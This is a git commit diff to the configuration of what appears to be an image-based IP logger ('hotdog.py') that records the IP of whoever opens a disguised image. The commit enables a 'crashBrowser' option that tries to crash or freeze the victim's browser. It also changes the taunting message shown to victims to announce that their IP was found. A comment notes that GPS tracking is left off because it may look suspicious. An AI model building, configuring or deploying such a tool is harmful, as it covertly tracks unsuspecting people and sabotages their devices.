8851b52e96d4f2ee030e980302d1a4fd30cd04b4
cf-tra1l <122414684+cf-tra1l@users.noreply.github.com>
2023-09-01 20:41:40 -0700

    Update hotdog.py

--- api/hotdog.py
+++ api/hotdog.py
@@ -22,13 +22,13 @@ config = {
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
     
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": True, # Enable the custom message?
-        "message": "I found your ip and Rick rolled you 🤡🤡🤡 {ip}", # Message to show
+        "message": "I found your ip and Crashed you 🤡🤡🤡 {ip}", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
